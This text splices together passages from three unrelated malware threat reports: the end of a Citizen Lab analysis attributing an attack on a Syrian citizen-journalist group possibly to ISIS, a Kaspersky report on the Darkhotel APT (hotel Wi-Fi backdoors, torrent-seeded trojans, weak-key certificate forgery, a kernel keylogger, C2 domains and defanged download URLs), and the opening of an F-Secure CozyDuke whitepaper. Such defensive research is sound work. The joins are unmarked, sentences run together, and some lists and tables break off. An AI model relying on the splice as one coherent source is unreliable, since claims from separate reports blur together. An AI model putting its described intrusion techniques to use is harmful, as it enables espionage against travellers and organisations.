prepare and send an implant that has significantly less functionality than what they commonly use.Taken together, we
find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack.ISIS-linked Hackers

RSS operates in territory controlled by ISIS, and has faced extensive targeting by ISIS.Currently, they appear to be
directly targeted by ISIS for kidnappings and other retaliation, including executions.In addition, ISIS supporters have
explicitly suggested that the group is under surveillance and actively hunted.Together this evidence suggests that ISIS
has a strong motivation for using social engineering and/or malware to locate the members of RSS.We think there are several features of the malware attack that align with the needs and constraints of
ISIS and its supporters in Ar-Raqqah, more so than other groups, as we understand them.For example:

      The malware beacons location but does not provide RAT functionality.The seeding attempts to obtain a ‘private’ Facebook identity from RSS through social engineering.The malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-
      control server online.The social media activity of members of RSS is often highly public.Their location and exact membership, however, is
secret.We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they
could have employed a RAT.However, if the attacker were interested in unmasking the location of its targets so they could
be physically tracked down, collecting IP data and system info would be a more reasonable approach.ISIS or its supporters clearly have a strong interest in the (rudimentary) location tracking of the members of RSS that this
malware provides.Internet connectivity in Raqqah is extremely limited, and some of it is under ISIS control.Knowing the
IP address of a target could quickly narrow down targets to specific locations, and specific Internet services, or Internet
cafes in Raqqah.Given that the identities and locations of RSS members are closely guarded, such information would hold
significant intelligence value for ISIS.Armed with this kind of information, ISIS could physically harm people within
Raqqah (and it is also possible that they have the ability to operate in some capacity in border areas of Turkey).Little is publicly known about the technical capabilities of ISIS and its supporters; however, reports have begun to emerge
suggesting that ISIS is interested in expanding its abilities.In addition, ISIS has reportedly gained the support of at least
one individual with some experience with social engineering and hacking: Junaid Hussain (aka TriCk), a former member
of teamp0ison hacking team.While Mr. Hussain and associates have reportedly made threats against Western
governments, it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted
organization, which is a highly visible thorn in the side of ISIS.Other Unknown Actors

It is possible that the attack is the product of actors working for unknown purposes and targeting RSS.Given the activities
of RSS, however, it is unclear who this might be.It is not possible, for example, to reject the theory that some unknown
group within the FSA, or other groups opposing the Assad regime are responsible.Citizen journalists in Ar-Raqqah were
previously critical of arbitrary arrests carried out by non-ISIS groups in 2013.However, it is unclear why those groups,
which no longer control Ar-Raqqah, would be interested in RSS in November 2014.It is likely that third party actors, including several intelligence services, are closely monitoring various actors in the
conflict through a range of electronic means.However, there is little reason to suggest that they would use a tailored but
technically rudimentary attack to target RSS in particular.Conclusion: ISIS Can’t Be Ruled Out

After considering each possibility, we find strong but inconclusive circumstantial evidence to support a
link to ISIS.However, we are unable to connect this attack directly to ISIS, Mr. Hussain, or other ISIS supporters.If
indeed ISIS or its supporters are responsible, it seems reasonable that such an offensive capability may still be in
development.We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its
targets.If ISIS is responsible, while this attack targets in-country impediments to ISIS objectives, other targets may
include ideological or military adversaries abroad.Whether or not ISIS is responsible, this attack is likely the work of a non-regime threat actor who may be just beginning to
field a still-rudimentary capability in the Syrian conflict.The entry costs for engaging in malware attacks in a conflict like
the Syrian Civil War are low, and made lower by the fact that the rule of law is nonexistent for large parts of the country.In
still other parts (under regime control), malware attacks appear to be state sanctioned.Attacks Targeting Civil Society

Citizen Lab research into targeted digital threats against civil society confirms that civil society groups
face grave threats from targeted malware attacks, despite being under-resourced to defend against them.The case highlighted here is no exception: lack of IT and security resources have made it difficult for the Syrian opposition
to address targeted and persistent digital threats against them.In addition, if ISIS is indeed responsible, this case suggests
how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities, and how quickly the
capabilities can be pointed at unarmed civil society groups.Warning: Social Engineering Thrives in Syrian Context

This attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the
targeted organization.As most organizations working on issues surrounding Syria are aware, malware delivered with good
social engineering is a constant source of danger.This particular attack can be prevented by not opening files sent by unknown persons.However, many
attacks in Syria come from hijacked accounts and impersonate people known to the targets.Social engineering remains an
unsolved problem, and continues to compromise groups throughout the Syrian opposition and their supporters.This attack reaffirms the dangers posed by social engineering attacks, whether they deliver phishing campaigns or
malware.The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a
threat, and their partner organizations and supporters, should urgently examine their security policies and assess
the possible risks to their operations, and the consequences of exposure of sensitive information to ISIS.Even if the link to ISIS turns out to be incorrect, it is possible that this will be a threat in the future.Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very
accessible videos on digital security.Special thanks to: several anonymous Syrians, Masashi Crete-Nishihata, Sarah McKune, Morgan Marquis-Boire, Ron
Deibert, Bill Marczak, Nart Villeneuve, Irene Poetranto, and Kristen Dennesen.Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford
Foundation.https://targetedthreats.netIn-
hospitably operating for almost a decade, the threat actor is currently active.The
actor’s offensive activity can be tied to specific hotel and business center Wi‑Fi
and physical connections, some of it is also tied to p2p/file sharing networks,
and they have been known to spear-phish targets as well.Darkhotel tools are
detected as “Tapaoux”, “Pioneer”, “Karba”, and “Nemim”, among other names.These might be GoogleToolbar, Adobe Flash, Windows Messenger, etc.This first stage of malware helps the attackers to identify more significant victims,
leading to the selective download of more advanced stealing tools.At the hotels, these installs are selectively distributed to targeted individuals.This
group of attackers seems to know in advance when these individuals will arrive
and depart from their high-end hotels.So, the attackers lay in wait until these
travelers arrive and connect to the Internet.The FBI issued advisories about similar hotel incidents; Australian government offi-
cials produced similar, newsworthy accounts when they were infected.While an FBI
announcement related to attacks on hotel guests overseas appeared in May 2012,
related Darkhotel samples were already circulating back in 2007.And available
Darkhotel server log data records connections as early as Jan 1, 2009.Addition-
ally, seeding p2p networks with widely spread malware and 0-day spear-phishing
attacks demonstrate that the Darkhotel APT maintains an effective toolset and a
long-running operation behind the questionable hospitality it shows its guests.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
                                                                                    5


Analysis
Delivery - Hotels/Business Centers and Indiscriminate Spread
Hotels and Business Centers Spread
The Darkhotel APT’s precise malware spread was observed in several hotels’
networks, where visitors connecting to the hotel’s Wi-Fi were prompted to install
software updates to popular software packages.Of course, these packages were really installers for Darkhotel APT’s backdoors,
added to legitimate installers from Adobe and Google.Digitally signed Darkhotel
backdoors were installed alongside the legitimate packages.The most interesting thing about this delivery method is that the hotels require
guests to use their last name and room number to login, yet only a few guests
received the Darkhotel package.When visiting the same hotels, our honeypot
research systems couldn’t attract a Darkhotel attack.This data is inconclusive,
but it points to misuse of check-in information.TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
6


Abusing Network Infrastructure
The Darkhotel actor maintained an effective intrusion set at hotel networks,
providing ample access to unexpected points of attack over several years.These
staging points also provide the attackers with access to check-in/check-out and
identity information of visitors to high-end and luxury hotels.As a part of an ongoing investigation, our research led us to embedded iframes
within hotel networks that redirected individuals’ web browsers to phony install-
ers.The attackers were very careful with the placement of these iframes and
executables on trusted resources - the hotels’ network login portals themselves.The attackers were also very careful to immediately delete all traces of their
tools as soon as an attack was carried out successfully.Those portals are now
reviewed, cleaned and undergoing a further review and hardening process.We
observed traces of a couple of these incidents in late 2013 and early 2014 on
a victim hotel’s network.The attackers set up the environment and hit their
individual targets with precision.As soon as their target’s stay was over and
the attack-frame was closed, the attackers deleted their iframe placement and
backdoored executables from the hotel network.The attackers successfully de-
leted traces of their work from earlier attacks in another hotel, but their offensive
techniques were the same.Outside reports of the same activity at other hotels
provide enough data to confirm the same careful operations there.The attack technique blurs the line between a couple of common APT tactics;
fairly inaccurate “watering holes” or “strategic web compromises” and more
accurate spearphishing techniques.In this case, the Darkhotel attackers wait
for their victim to connect to the Internet over the hotel Wi-Fi or the cable in their
room.There is a very strong likelihood the targets will connect over these resourc-
es, and the attackers rely on that likelihood, much like at a watering hole.But the
attackers also maintain truly precise targeting information over the victim’s visit,
much like they would know a victim’s email address and content interests in a
spearphishing attack.While setting up the attack, the Darkhotel attackers knew
the target’s expected arrival and departure times, room number, and full name,
among other data.This data enables the attackers to present the malicious
iframe precisely to that individual target.So, here we have yet another unique
characteristic of this attacker - they employ a loosely certain but highly precise
offensive approach.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
                                                                                       7


Indiscriminate Spread
An example of the Darkhotel APT’s indiscriminate malware spreading is dem-
onstrated by the way it seeds Japanese p2p sharing sites, where the malware
is delivered as a part of a large (approximately 900mb) rar archive.The archive
is also spread over bittorrent, as detailed below.Darkhotel uses this method to
distribute their Karba Trojan.These Japanese archives, translated for Chinese
speaking viewers, appear to be sexual in nature, part of an anime sex/military
comic scene, exposing the likely interests of potential targets.This Darkhotel package was downloaded over 30,000 times in less than
six months.The p2p bittorrent Darkhotel offering is listed here, posted on
2013.11.22.It was spread throughout 2014.(一般コミック) [古味直志] ニセコイ 第01­09巻.rar




This torrent serves up an almost 900 mb file.The rar archive decompresses to
a directory full of encrypted zips, the associated decryptor and a password file for
decrypting the zips.But what looks like the AxDecrypt.exe decryptor is bound to
both the true decryptor and the dropper for the Darkhotel Catch.exe Karba Trojan.When a user downloads the torrent and decrypts the zip files, the trojan surrepti-
tiously is installed and run on the victim system.Catch.exe, detected as Backdoor.Win32.Agent.dgrn, communicates with the fol-
lowing Darkhotel command and control servers:

microdelta.crabdance.com
microyours.ignorelist.com
micronames.jumpingcrab.com
microchisk.mooo.com
microalba.serveftp.com



TLP: Green	                  For any inquiries, please contact intelreports@kaspersky.com
8


Other examples of this Darkhotel backdoor bound within a shared torrent include
adult content Japanese anime and more.There are tens of thousands of down-
loads of these individual torrents.“torrent\[hgd资源组][漫画]comic1☆7漫画合集③+④+⑤+特典[5.08g][绅士
向][总第四十三弹]（七夕节快乐！）\汉化\(comic1☆7) [莉零 (小鹿りな, 古
代兵器)] 凌 ­shinogi­(闪乱カグラ) [中文] “
and
“動漫\[hgd资源组][漫画]comic1☆7漫画合集③+④+⑤+特典[5.08g][绅士向][
总第四十三弹]（七夕节快乐！）\汉化”)
The associated Darkhotel backdoor was hosted on bittorrent, emule, etc, under
a variety of comic names.Examples include comics and anime offerings.Related
Darkhotel command and control server domains include:

 microblo5.mooo.com
 microyours.ignorelist.com
 micronames.jumpingcrab.com
 microchisk.mooo.com
 microalba.serveftp.com


Darkhotel Spear-phishing Campaigns
Darkhotel campaigns involving typical spear-phished Tapaoux implants publicly
appeared in bits and pieces several times over the past five years.These subproject
efforts targeted defense industrial base (DIB), government, and NGO organizations.Email content on topics like nuclear energy and weaponry capabilities was used as
a lure.Early accounts were posted on contagio describing attacks on NGO organi-
zations and government policy makers.This spear-phishing activity continues into
2014.The attacks follow the typical spear-phishing process and in the past couple of
months, exploited systems retrieved downloader executables from web servers like
hxxp://office­revision.com/update/files22/update.exe or hxxp://trade­inf.com/mt/
duspr.exe
Over the past few years the group has emailed links that redirect targets’ brows-
ers to Internet Explorer 0-day exploits.Sometimes the attachment itself includes
an Adobe 0-day exploit.TLP: Green	                   For any inquiries, please contact intelreports@kaspersky.com
                                                                                                     9


Recent 0-day Deployment
This crew occasionally deploys 0-day exploits, but burns them when required.In
the past few years, they deployed 0-day spear-phishing attacks targeting Adobe
products and Microsoft Internet Explorer, including cve­2010­0188.In early 2014,
our researchers exposed their use of cve­2014­0497, a Flash 0-day described on
Securelist in early February.The crew spear-phished a set of target systems connected to the Internet through
Chinese ISPs, and developed capabilities within the 0-day exploits to handle
hardened Windows 8.1 systems.It’s interesting that the Flash objects were
embedded in Korean documents titled “List of the latest Japanese AV wind and
how to use torrents.docx” (loose English translation).The dropped downloader
(d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the
“Information Stealer” component functionality summarized below, and detailed
in Appendix D.

Digital Certificates and Delegitimizing Certificate Authority
Trust
The Darkhotel actors typically sign their backdoors with digital certificates of one
kind or another.However, the certificates originally chosen by this crew are very
interesting because of their weak keys and likely abuse by attackers.Here is a
listing of the certs that were commonly used to sign Darkhotel malcode, requiring
advanced mathematical capabilities to factorize the keys at the time.They are
not the only certificates used by the group.More recent activity suggests that the
group has stolen certificates to sign their code.12/7/2009    12/7/2010
CyberTrust    (Enrich)             sha1/RSA (512 bits)

GTE           TaiCA Secure CA      esupplychain.com.tw         Expired        7/2/2010     7/17/2011
CyberTrust                         sha1/RSA (512 bits)

GTE           Digisign Server ID   mcrs2.digicert.com.my      Invalid Sig    3/28/2010    3/28/2012
CyberTrust    (Enrich)             sha1/RSA (512 bits)

GTE           Cybertrust           agreement.syniverse.Invalid Sig        2/13/2009    2/13/2011
CyberTrust    SureServer CA        com sha1/RSA (512 bits)

GTE           Cybertrust           ambermms.syniverse.Invalid Sig.2/16/2009    2/16/2011
CyberTrust    SureServer CA        com
                                   sha1/RSA (512 bits)
Equifax       Equifax Secure       secure.hotelreykjavik.i s   Invalid Sig    2/27/2005    3/30/2007
Secure        eBusiness CA­1       md5/RSA (512 bits)
eBusiness
CA­1
GTE           Cybertrust           stfmail.ccn.ac.uk sha1/     Invalid Sig.11/12/2008   11/12/2011
CyberTrust    Educational CA       RSA (512 bits)

GTE           Digisign Server ID   webmail.jaring.my sha1/ Invalid Sig        6/1/2009     6/1/2011
CyberTrust    (Enrich)             RSA (512 bits)

GTE           Cybertrust           skillsforge.londonmet.Invalid Sig    1/16/2009    1/16/2012
CyberTrust    Educational CA       ac.uk
                                   sha1/RSA (512 bits)
GTE           Digisign Server ID   anjungnet.mardi.gov.Invalid Sig   2/17/2009    2/17/2011
Cybertrust    SureServer CA   com
                              sha1/RSA (512 bits)

All related cases of signed Darkhotel malware share the same Root Certificate
Authority and Intermediate Certificate Authority that issued certificates with
weak md5 keys (RSA 512 bits).We are confident that our Darkhotel threat actor
fraudulently duplicated these certificates to sign its malware.These keys were
not stolen.Many of the certificates were noted in a 2011 Fox­IT post “RSA­512
Certificates Abused in the Wild”.To further support this speculation please note the non­specific Microsoft Security
Advisory below, the Mozilla advisory addressing the issue at the time, and the
Entrust responses.From Microsoft’s security advisory from Thursday, November 10, 2011:
“Microsoft is aware that DigiCert Sdn.Bhd, a Malaysian subordinate certifica-
tion authority (CA) under Entrust and GTE CyberTrust, has issued 22 certifi-
cates with weak 512 bit keys.These weak encryption keys, when broken, could
allow an attacker to use the certificates fraudulently to spoof content, perform
phishing attacks, or perform man­in­the­middle attacks against all Web browser
users including users of Internet Explorer.While this is not a vulnerability in a
Microsoft product, this issue affects all supported releases of Microsoft Windows.There is no indication that any certificates were issued fraudulently.Instead,
cryptographically weak keys have allowed some of the certificates to be dupli-
cated and used in a fraudulent manner.Microsoft is providing an update for all supported releases of Microsoft Windows
that revokes the trust in DigiCert Sdn.Bhd.The update revokes the trust of the
following two intermediate CA certificates: Digisign Server ID – (Enrich), issued by
Entrust.net Certification Authority (2048) Digisign Server ID (Enrich), issued by
GTE CyberTrust Global Root”
From Mozilla’s 2011 response:
“While there is no indication they were issued fraudulently, the weak keys have
allowed the certificates to be compromised.Furthermore, certificates from this
CA contain several technical issues.They lack an EKU extension specifying their
intended usage and they have been issued without revocation information.”



TLP: Green	                   For any inquiries, please contact intelreports@kaspersky.com
12


From Entrust’s response:
“There is no evidence that the Digicert Malaysia certificate authorities have been
compromised.”

Cracking the keys
Here are some notes on the costs and technical requirements of attacking these
certificates.The computing power required to crack and factor an RSA 512 bit key was $5000
and the period of time required was about 2 weeks.(see http://lukenotricks.blogspot.co.at/2010/03/rsa­512­factoring­service­two­weeks.html)
In October 2012, Tom Ritter reported that it would cost about $120­-$150, per-
haps even as little as $75.Going even further back, there was much discussion about the technical meth-
ods of cracking these keys:
DJ Bernstein’s 2001 paper on building a machine reducing the cost of integer
factorization with Number Field Sieve techniques, breaking 1024 bit RSA keys.RSA’s reaction and 2002 statement on whether or not 1024 bit RSA keys are
broken: “NIST offered a table of proposed key sizes for discussion at its key man-
agement workshop in November 2001 [7].For data that needs to be protected no
later than the year 2015, the table indicates that the RSA key size should be at
least 1024 bits.For data that needs to be protected longer, the key size should be
at least 2048 bits.”

Other Tapaoux Certificates
Recent Tapaoux attacks and backdoors include malware signed with strong
SHA1/RSA 2048 bit certificates, suggesting certificate theft.Subordinate
CA Root       CA/Issuer        Owner               Status       Valid From    Valid To
thawte        thawte Primary   Xuchang Hongguang Revoked        7/18/2013     7/16/2014
              Root CA          Technology Co.,Ltd.It is clean, well­written,
kernel level malcode.The languages of its strings are a mix of English and Korean.It
is signed with the familiar “belinda.jablonski@syniverse.com” digital certificate.This keylogger is dropped by code running within svchost.exe on WinXP SP3,
which maintains an interesting debug string:
d:\KerKey\KerKey(일반)\KerKey\release\KerKey.pdb
Note 일반 means “General” in Korean
It probably was developed as a part of a mid-to-late 2009 project:
e:\project\2009\x\total_source\32bit\ndiskpro\src\ioman.c

Keylogger Code
This driver package is built to resemble a legitimate low-level Microsoft system
device.It is installed as a system kernel driver “Ndiskpro” service, described as
a “Microcode Update Device”.It is slightly surprising that no rootkit functionality
hides this service:




When loaded, the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff, and
retrieves keystroke data directly from port 0x60, the motherboard keyboard con-
troller itself.It buffers, then communicates logged user data to the running user
mode component.This component then encrypts and writes the retrieved values
ondisk to a randomly named .tmp, file like ffffz07131101.tmp.This file is located
in the same directory as the original dropper, which maintains persistence across
reboots with a simple addition to the HKCU run key.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
14




This keylogger module encrypts and stores gathered data in a log file, as men-
tioned previously.Its encryption algorithm is similar to RC4.The interesting part is
that the module randomly generates the key and stores it in an unexpected place:
in the middle of the log file name.Hence, the numeric part of the filename is used
as a seed for the pseudorandom number generator.The rand function is statically
linked to ensure same results on different computers.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  15


Interesting Malware Components
The Darkhotel toolset consists of multiple components that have been slightly
modified over time.These tools are dropped by hotel installers spoofing legiti-
mate software installers, bound within torrent bundles, or dropped by exploits or
hypertext linked from spear-phishing emails.More advanced tools, like the keylogger decribed above, are later downloaded to
the victim system by one of these implants.In a recent case, word docs embed-
ded with 0-day flash swf files either dropped these backdoors or downloaded and
executed backdoors from remote web servers.These tools pull down the keylog-
ger, steal information from the system, or download other tools.This module is designed to update malicious components through recurring checks
at the C&C server.It is also capable of removing some older components, the names
of which are hardcoded in the body of the malware.The module adds autorun registry
settings to enable an automatic start during system boot.TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
16


One of the most interesting functions of this executable is its unusual delay and
persistence.If a special file exists on the system, the module will not start calling
back to C&C server until the special file is 180 days old.So, if some other critical
malicious component was removed during this period, current module backs up
and restores access to the system within 6 months.The component gathers system information and sends it to the Darkhotel com-
mand and control servers as detailed in Appendix D.

Information Stealer
This module is relatively large (455Kb) and comes as a part of a WinRar SFX file
that drops and starts the module from %APPDATA%\Microsoft\Display\DmaUp3.exe.logins
   ◦◦ Yahoo!Japan logins
   ◦◦ Microsoft Live logins
   ◦◦ Google login credentials
This module is designed to terminate itself on Windows with the system de-
fault codepage set to Korean.Trojan.Win32.Karba.e
This malware is 220Kb in size.It was built as MFC framework application with a
lot of extra calls that should have complicated the analysis of the sample.It mim-
ics a GUI desktop application but it does not create any visible windows or dialogs
to interact with local users.The Trojan collects data about the system and anti­
malware software installed on it, and uploads that data to Darkhotel command
and control servers.More technical details are provided in Appendix D.

Trojan-Dropper & Injector (infected legitimate files)
This malware is 63kb in size.It is bound to a variety of other software packages
that vary in name, but the host package is consistently detected as “Virus.Win32.Pioneer.dx”.It drops the igfxext.exe “selective infector” component to disk and
runs it.TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
18


Selective Infector
This component is a virus, and is used to selectively infiltrate into other comput-
ers via USB or network shares.First, the virus retrieves all available disks and starting from disk number 4 (D:\)
to disk number 20 (Z:\), finds executable files and infects them.The code simply
brute forces the list of mapped removable drives.During its infection routine, the infector changes the entrypoint of executable
files, creates an .rdat section, and inserts a small loader in the section, then puts
its main payload in the overlay.Every infected file has functionality described in
Trojan­Dropper & Injector section, so it can collect information about the comput-
er, send it to the C2 and download other Darkhotel components as commanded.Observed downloaded components are signed with a familiar expired certificate
from www.esupplychain.com.tw, issued by Cybertrust SureServer CA.Again, further technical details are provided in Appendix D.

Campaign Codes
Almost every backdoor in this set maintains an internal campaign code or id, used
in initial c2 communications as described above.Some IDs appear to be related to
geographic interests, others do not seem obvious.We gathered a list of Darkhotel
campaign IDs shown below.Internal IDs and c2 resources overlap across these com-
ponents, there is no pattern of distribution according to connectback resources.However, they are ef-
fective at maintaining a fully available infrastructure to support new and existing
infections.Overall, victims in our sinkhole logs and KSN data were found across the globe,
with the majority in Japan, Taiwan, China, Russia, Korea and Hong Kong.These geolocation
estimates probably provide the most accurate picture of where Darkhotel activity
is occurring.TLP: Green	              For any inquiries, please contact intelreports@kaspersky.com
                                                                                   21


Here is a pie chart to better visualize the proportions of attack activity throughout
the world.As you can see, over 90% of it occurs in the top five countries: Japan,
followed by Taiwan, China, Russia and Korea.TLP: Green	                For any inquiries, please contact intelreports@kaspersky.com
22


Sinkhole Data
Because the operators very actively build up new command and control serv-
ers, it is difficult to sinkhole enough domains to get an accurate overall picture
of victim system location based on this data.Also, many researcher systems are
connected to the sinkholed domains.However, this graph of current sinkhole
callbacks presents a low confidence distribution of victim geolocation, with India,
Japan, Ireland, Korea, China and Taiwan in the top slots.Removing India and
Ireland, the set more closely matches our KSN data.Available ddrlog Victim Data
Many of these c2s maintain a common directory path that serves a ddrlog.The
ddrlogs appear to maintain callback data that the attackers want to set aside in
error logs.Many of the callback URLs have errors, many are from unwanted IP
ranges, and others are clearly unwanted researcher sandbox system callbacks.Those records are formatted in the following manner:

 2009.01.01 09:16:00 150.70.xxx.xx >
                                   ­­ B
 2009.01.01 09:16:33 150.70.xxx.xx >
                                   ­­ B
 2009.01.01 09:14:52 220.108.x.xxx >
                                   ­­ L
 2009.01.01 09:16:04 112.70.xx.xx >
                                  ­­ L

Only 120 IP addresses perform the “B” checkin, and 90% of these are from the
range 150.70.97.x.This entire range is owned by Trend Micro in Tokyo, JP.A handful of the remaining addresses, like 222.150.70.228, appear to come
from other ranges owned by Trend Micro in JP.One outlier comes from an El Sal-
vadoran ISP, and another is connected to a Japanese ISP.Approximately 20,000
IP addresses perform the “L” checkin.Other ddrlogs may include “A” tags as well.The “A” tag labels unwanted checkins from untargeted locations, like Hungary
and Italy.The “B” tag labels unwanted checkins from Trend Micro IP ranges.The “L” tag labels unwanted checkins from a variety of ranges, but includes odd
IP like the loopback address, 127.0.0.1, clearly an error.Entries in these logs include callback URLs that have spaces and unusual charac-
ters that do not conform to the required base64 character dictionary.When an unauthorized user attempts to access a
Darkhotel web interface for victim management without the correct passkey, the
html page and table layout renders properly, but all the data values on the page
are returned as garbled ciphertext.TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
                                                                                  25


Victim Management
New victim systems appear to be systematically vetted.The attackers maintain
a web interface to vet these new victim systems.The attackers first and foremost
list and sort victim systems according to their latest c2 check­in.Collected data
probably is presented in order of importance:
1.	 user’s logon name
2.	 system CPU and OS
3.“Ping sec”, or how far the victim system is from the c2
4.“In”, or the process that the attackers’ dll code executes within
5.Vac: ??6.	 system LAN IP
7.	 network WAN IP
Here is an example of one of these web pages:




TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
26


Researcher Activity
Clearly, some automated analysis activity involving researchers’ sandbox tools
are filling up these logs.From June 2013 to April 2014 (approximately an 11
month period), in only 15 ddrlog files, we observe almost 7,000 connections from
research sandbox systems.The network connections provide a1= through a3=
values identifying a QEMU based sandbox, all sourced from only 485 WAN IP ad-
dresses.Under 30 lan IPs are recorded, all in the same 172.16.2.14­126 range.This system(s) uses a “Dave” user account and “HOME­OFF­D5F0AC” Windows
system name.These characteristics correspond with network activity generated by GFI Soft-
ware’s “CWsandbox” tools, now owned by “ThreatTrack Security”.TLP: Green	              For any inquiries, please contact intelreports@kaspersky.com
                                                                                  27


Conclusions
For the past seven years, a strong threat actor named Darkhotel, also known as
Tapaoux, has carried out a number of successful attacks against a wide range of
victims from around the world.It employs methods and techniques which go well
beyond typical cybercriminal behavior.The Darkhotel crew’s skillset allows it to launch interesting cryptographical at-
tacks, for instance factoring 512 bit RSA keys.Its use of 0-days is another indica-
tor of a strong threat actor.The targeting of top executives from various large companies around the world
during their stay at certain “Dark Hotels” is one of the most interesting aspects of
this operation.The exact method of targeting is still unknown - for instance, why
some people are targeted while others are not.The fact that most of the time the
victims are top executives indicates the attackers have knowledge of their victims
whereabouts, including name and place of stay.This paints a dark, dangerous
web in which unsuspecting travelers can easily fall.While the exact reason why
some hotels function as an attacker vector are unknown, certain suspicions ex-
ist, indicating possibly a much larger compromise.We are still investigating this
aspect of the operation and will publish more information in the future.A further interesting trait is the deployment of multiple types of campaigns, both
targeted and botnet.This is becoming more and more common on the APT scene,
where targeted attacks are used to compromise high profile victims and botnet
style operations are used for massive surveillance or performing other tasks such
as launching DDoS attacks on hostile parties or simply upgrading victims to more
sophisticated espionage tools.We expect the Darkhotel crew to continue their activities against DIB, Govern-
ment and NGO sectors.The appendix released with this paper provides technical
indicators of compromise which should help victims identify the malicious traffic
and enable targets to protect themselves better against attack.TLP: Green	               For any inquiries, please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow, 125212
Russian Federation

more contact details

Tel:	+7-495-797-8700
Fax:	+7-495-797-8709

E-mail:	 info@kaspersky.com
Website:	 www.kaspersky.comThe CozyDuke toolset, which we believe has been 
under active development since at least 2011, 
consists of tools for infecting targeted hosts, 
establishing and maintaining backdoor access to the 
hosts, gathering information from them and gaining 
further access to other hosts inside the victim 
organization.Based on command and control (C&C) server 
information found being used by CozyDuke tools, 
we believe the CozyDuke toolset is used by at least 
one malicious actor who also uses, or at the least 
shares, infrastructure with actors using the known 
threats, MiniDuke and OnionDuke.F-SECURE LABS 
SECURITY RESPONSE
Malware analysis 
Whitepaper

2

INTRODUCTION

Target details

THE COZYDUKE TOOLSET
CozyDuke, as referred to in this document, is a set of tools 
used by one or more malicious actors for performing 
targeted attacks against high profile organizations.The 
core of the CozyDuke toolset is a modular attack platform 
consisting of a main component augmented by a set of 
additional modules implementing further functionality.The CozyDuke toolset also includes multiple kinds 
of droppers for infecting hosts with CozyDuke or for 
executing additional tools from the CozyDuke toolset.Finally, the CozyDuke toolset includes tools and scripts – 
some custom-written, others based on openly available 
tools – that are used for purposes such as gathering 
further information from infected hosts or for infecting 
additional hosts in the same target organization.ATTACK OVERVIEW 

Infection vector
We have observed CozyDuke being spread via email, 
which usually contain a link to a compromised website 
hosting a ZIP file (although in at least one case, the file was 
hosted on Dropbox).These files contain an executable 
that, upon execution, will write to disk and execute 
CozyDuke, while at the same time presenting the user 
with a decoy to divert attention.The decoy is usually an 
uninteresting PDF, but we have also observed a Flash 
video of monkeys being presented as the decoy.We have reason to believe CozyDuke is being used to 
target governmental organizations and entities that work 
closely with such bodies.Timeline

We believe the current CozyDuke activity started at 
the end of January 2015.Most of the samples we have 
observed were compiled beginning from the end of 
January.However, based on comparisons of recent 
CozyDuke samples against older samples we have 
obtained dating back as far as the end of 2011, we believe 
CozyDuke has been under active development since at 
least 2011.Attribution & links

We have strong evidence suggesting the group using 
CozyDuke is the same as - or at the least shares command 
and control infrastructure with - the group or groups 
using MiniDuke and OnionDuke.Firstly, a CozyDuke 
sample from February of 2012 attempts to contact 
a C&C server at nostressjob.com.This domain has 
previously been associated with known MiniDuke C&C 
infrastructure.This same infrastructure has also been seen 
in use by OnionDuke.Secondly, we also have reason to 
believe CozyDuke has, in some instances, downloaded 
and executed droppers for DLL files reminiscent of 
OnionDuke.Specifically, the DLLs dropped have used file 
and export names also used by OnionDuke.Additionally, 
the strings in the DLLs have been encrypted using the 
same algorithm used by OnionDuke.This link is, however, 
not as conclusive as the infrastructure overlap.FIGURE 1: C&C INFRASTRUCTURE CONNECTIONS  
BETWEEN COZYDUKE, MINIDUKE AND ONIONDUKE

CozyDuke

MiniDuke

OnionDuke

nostressjob.com

grouptumbler.com

overpict.com

postmaster@grouptumbler.com

John Kasai

COZYDUKE  Malware analysisTECHNICAL DETAILS 

INITIAL INFECTION
Infection with CozyDuke begins with the victim receiving 
an email containing a link to a ZIP file.This ZIP file will 
contain a single executable, usually a self-extracting RAR 
archive.Upon execution, it will write two files to disk.The first file is a decoy.The decoy has usually been a PDF 
document but Flash videos have also been observed in 
some cases.The second file extracted from the archive is 
a CozyDuke dropper.This dropper will then proceed to 
write to disk the main CozyDuke components as well as an 
encrypted configuration file used by CozyDuke.FIGURE 2: THE COZYDUKE INFECTION FLOW

Malicious link

ZIP file

Downloads

ZIP file

Extracts

Self-extracting 

RAR

Extracts

Extracts

CozyDuke main dropper

Decoy document

3

COZYDUKE MAIN DROPPER
The main CozyDuke dropper, used for infecting hosts 
with CozyDuke, begins by checking whether the victim 
has an anti-virus product installed.Should an installed 
product be found, it will be compared to a predetermined 
list of product names.If the installed product matches 
a name on the list, the dropper will immediately exit.Newer versions of the dropper will perform additional 
checks to ensure the dropper is not being executed inside 
a virtual machine or a known malware analysis sandbox 
environment.Should either of these checks fail, the 
dropper will likewise exit immediately.Next, the dropper will find and decrypt encrypted data 
stored as two PE resources embedded in the executable.These resources are named with the hexadecimal 
identifiers 0x000A and 0x000B.Both resources are 
structured similarily.They begin with a four-byte value 
specifying the length of the included decryption key.This decryption key immediately follows the length field.Finally, the rest of the resource is the encrypted payload.The encryption used is a simple XOR with a rotating key.The first resource, 0x000A, contains as its payload a 
Microsoft cabinet archive.This archive contains the 
CozyDuke components that the dropper will later install 
on the victim system.The second resource, 0x000B, 
contains as its payload an XML file with instructions for the 
dropper on where to install the dropped components and 
what to  name them.The dropper will then proceed to write the CozyDuke 
components to the specified location.The dropper 
will additionally copy the system file rundll32.exe to the 
install location for CozyDuke.This file will also use a name 
